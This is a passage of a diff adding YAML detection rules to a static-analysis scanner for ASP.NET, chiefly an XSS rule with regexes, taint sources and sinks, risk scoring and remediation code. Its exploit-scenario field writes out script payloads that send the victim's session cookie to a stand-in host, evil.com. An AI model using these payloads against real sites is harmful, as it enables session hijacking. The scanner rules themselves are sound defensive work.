+      relationship: Deserialization gadget chains often invoke Process.Start for RCE
+    - rule_id: CS-INJ-001
+      relationship: Deserialized objects may flow into SQL queries creating injection chains
+    - rule_id: CS-INJ-005
+      relationship: Deserialized data rendered without encoding creates stored XSS
+    compound_risk_note: 'BinaryFormatter deserialization is almost always exploitable when processing untrusted data. Requires
+      minimal AI validation since the presence of BinaryFormatter.Deserialize alone is sufficient for a critical finding.
+      Check if deserialized data flows into CS-INJ-001 or CS-INJ-002 sinks for compound RCE chains.
+
+      '
+  detection_layer: 1
+- rule_id: CS-INJ-005
+  title: XSS via Unencoded Response Output
+  description: 'Detects direct writing of user input to HTTP response without encoding in ASP.NET applications. Covers Response.Write,
+    Html.Raw, Content() results, and ViewData/ViewBag rendering patterns where user-controlled data is reflected or stored
+    without proper HTML encoding, enabling cross-site scripting attacks.
+
+    '
+  language: csharp
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-79
+  owasp: A03:2021-Injection
+  tags:
+  - xss
+  - response-write
+  - html-injection
+  - reflected-xss
+  - stored-xss
+  - dotnet-core
+  patterns:
+  - type: regex
+    pattern: Response\.Write\s*\(\s*(?:Request|param|input|user)\b
+    description: Response.Write with direct user input
+  - type: regex
+    pattern: Response\.Write\s*\(\s*Request\.(?:QueryString|Form|Params|Headers)\[
+    description: Response.Write with Request collection access
+  - type: regex
+    pattern: '@Html\.Raw\s*\(\s*(?:Model|ViewBag|ViewData|TempData)\.'
+    description: Html.Raw rendering model/view data without encoding
+  - type: regex
+    pattern: Content\s*\(\s*(?:Request|param|input|user)\b[^)]*,\s*"text/html"
+    description: Content result with user input as HTML
+  - type: regex
+    pattern: Response\.Write\s*\(\s*\$"[^"]*\{[^}]*(?:Request|param|input|user)\b
+    description: Response.Write with interpolated user input
+  - type: regex
+    pattern: '@Html\.Raw\s*\(\s*(?:Request|param|input|user|args)\b'
+    description: Html.Raw directly rendering user-controlled input
+  - type: regex
+    pattern: ViewBag\.\w+\s*=\s*(?:Request|param|input|user)\b[^;]*;[^}]*@ViewBag\.
+    description: User input stored in ViewBag and rendered in view
+  - type: regex
+    pattern: ContentResult\s*\{[^}]*Content\s*=\s*(?:Request|param|input|user)\b[^}]*ContentType\s*=\s*"text/html"
+    description: ContentResult with user data as HTML content
+  - type: regex
+    pattern: document\.write\s*\(\s*[^)]*(?:@Model|@ViewBag|@ViewData)\.
+    description: JavaScript document.write with server-rendered model data
+  - type: regex
+    pattern: innerHTML\s*=\s*[^;]*(?:@Model|@ViewBag|@ViewData)\.
+    description: innerHTML assignment with server-rendered model data
+  - type: regex
+    pattern: (?:StringWriter|HtmlTextWriter)\s*\([^)]*\)[^;]*\.Write\s*\([^)]*(?:Request|param|input|user)\b
+    description: HtmlTextWriter outputting user-controlled content
+  - type: regex
+    pattern: return\s+Content\s*\(\s*\$"<[^"]*\{[^}]*(?:Request|param|input|user)\b
+    description: Content result returning interpolated HTML with user input
+  anti_patterns:
+  - HtmlEncode
+  - AntiXssEncoder
+  - HttpUtility.HtmlEncode
+  - WebUtility.HtmlEncode
+  - .Where(x =>
+  - DbContext
+  - .SaveChangesAsync
+  - connection.Query
+  - DynamicParameters
+  - app.UseCsp
+  - app.UseHsts
+  - Content-Security-Policy
+  - '[ValidateAntiForgeryToken]'
+  - '[AutoValidateAntiforgeryToken]'
+  - AntiforgeryMiddleware
+  - '@Html.DisplayFor'
+  - '@Html.EditorFor'
+  - '@Html.TextBoxFor'
+  - '@Html.LabelFor'
+  - '@Model.'
+  - '@Html.Encode'
+  - '@Html.AntiForgeryToken'
+  - HtmlEncoder.Default.Encode
+  - JavaScriptEncoder.Default.Encode
+  - UrlEncoder.Default.Encode
+  - System.Text.Encodings.Web
+  - Microsoft.AspNetCore.Html.HtmlString
+  context_awareness:
+    surrounding_context_patterns:
+    - using System.Web
+    - using Microsoft.AspNetCore.Mvc
+    - using Microsoft.AspNetCore.Html
+    - Controller
+    - ControllerBase
+    - RazorPage
+    - PageModel
+    - '@page'
+    - '@model'
+    - IHtmlHelper
+    taint_source_indicators:
+    - Request.QueryString
+    - Request.Form
+    - Request.Params
+    - Request.Headers
+    - Request.Cookies
+    - '[FromQuery]'
+    - '[FromRoute]'
+    - '[FromBody]'
+    - '[FromForm]'
+    - '[FromHeader]'
+    - HttpContext.Request
+    - Model.
+    - ViewBag.
+    - ViewData[
+    - TempData[
+    - RouteData.Values
+    taint_sink_indicators:
+    - Response.Write
+    - '@Html.Raw'
+    - Content(
+    - ContentResult
+    - innerHTML
+    - document.write
+    - HtmlTextWriter
+    - StringWriter
+    - Response.OutputStream
+    - Response.Body
+    sanitization_patterns:
+    - HttpUtility.HtmlEncode
+    - WebUtility.HtmlEncode
+    - HtmlEncoder.Default.Encode
+    - JavaScriptEncoder.Default.Encode
+    - UrlEncoder.Default.Encode
+    - AntiXssEncoder.HtmlEncode
+    - Server.HtmlEncode
+    - Html.Encode
+    - Sanitizer.GetSafeHtml
+    - HtmlSanitizer
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * proximity_to_user_input * (1 - csp_header_present)
+    exploitability_score: 7.0
+  exploit_scenario:
+    attack_example: 'A search results page displays the search term using @Html.Raw(ViewBag.SearchTerm) where SearchTerm comes
+      from the query string. An attacker crafts a URL: https://example.com/search?q=<script>document.location=''https://evil.com/steal?c=''+document.cookie</script>
+      When a victim clicks this link, their session cookie is sent to the attacker, enabling session hijacking.
+
+      '
+    example_payload: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+    attacker_objective: 'Execute arbitrary JavaScript in the victim''s browser to steal session tokens, capture keystrokes,
+      redirect users to phishing pages, deface the application, or perform actions on behalf of the authenticated user.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.9
+    context_match: 0.85
+    proximity_to_user_input: 0.88
+    sanitization_absence: 0.8
+  impact: 'Cross-site scripting enabling session hijacking, credential theft,
+
+    and malicious code execution in user browsers. Stored XSS variants
+
+    affect all users who view the compromised content. May lead to
+
+    account takeover, data exfiltration, and phishing attacks.
+
+    '
+  remediation: "**Razor Auto-Encoding (ASP.NET Core Default):**\n  @* Razor automatically HTML-encodes @ expressions *@\n\
+    \  <p>Search results for: @Model.SearchTerm</p>\n  @* NEVER use @Html.Raw with user input *@\n\n**Explicit Encoding in\
+    \ Controllers (ASP.NET Core):**\n  using System.Text.Encodings.Web;\n\n  public class SearchController : Controller\n\
+    \  {\n      private readonly HtmlEncoder _htmlEncoder;\n\n      public SearchController(HtmlEncoder htmlEncoder)\n   \
+    \   {\n          _htmlEncoder = htmlEncoder;\n      }\n\n      public IActionResult Results(string query)\n      {\n \
+    \         ViewBag.SafeQuery = _htmlEncoder.Encode(query);\n          return View();\n      }\n  }\n\n**Content Security\
+    \ Policy (.NET 8):**\n  // In Program.cs\n  app.Use(async (context, next) =>\n  {\n      context.Response.Headers.Append(\n\
+    \          \"Content-Security-Policy\",\n          \"default-src 'self'; script-src 'self'; style-src 'self'\");\n   \
+    \   await next();\n  });\n\n  // Or use NWebsec middleware\n  app.UseXContentTypeOptions();\n  app.UseXXssProtection(options\
+    \ => options.EnabledWithBlockMode());\n  app.UseCsp(options => options\n      .DefaultSources(s => s.Self())\n      .ScriptSources(s\
+    \ => s.Self()));\n\n**Entity Framework Core (Stored XSS Prevention):**\n  // Always encode data before storing if it will\
+    \ be rendered as HTML\n  var comment = new Comment\n  {\n      Text = HtmlEncoder.Default.Encode(userInput),\n      AuthorId\
+    \ = currentUserId\n  };\n  await _context.Comments.AddAsync(comment);\n\n**JavaScript Context Encoding (.NET 8):**\n \
+    \ @using System.Text.Encodings.Web\n  @inject JavaScriptEncoder JsEncoder\n  <script>\n      var userName = '@JsEncoder.Encode(Model.UserName)';\n\
+    \  </script>\n\n**Anti-Forgery Tokens (ASP.NET Core):**\n  // Global registration in Program.cs\n  builder.Services.AddControllersWithViews(options\
+    \ =>\n  {\n      options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());\n  });\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/79.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting
+  - https://learn.microsoft.com/en-us/aspnet/core/mvc/views/razor
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    original_author: security-rules-team
+    framework_targets:
+    - ASP.NET Core
+    - ASP.NET MVC
+    - Razor Pages
+    - .NET 8
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - rule_id: CS-INJ-001
+      relationship: SQL injection data stored in DB and rendered without encoding creates stored XSS
+    - rule_id: CS-INJ-003
+      relationship: LDAP query results displayed without encoding can lead to XSS
+    - rule_id: CS-INJ-004
+      relationship: Deserialized data rendered in views without encoding enables XSS
+    compound_risk_note: 'XSS vulnerabilities compound with all other injection types. SQL injection (CS-INJ-001) that stores
+      attacker-controlled data creates stored XSS when that data is rendered via CS-INJ-005 sinks. Always check if data from
+      injection-vulnerable sources flows into response rendering without encoding. Presence of Content-Security-Policy headers
+      reduces but does not eliminate risk.
+
+      '
+  detection_layer: 1
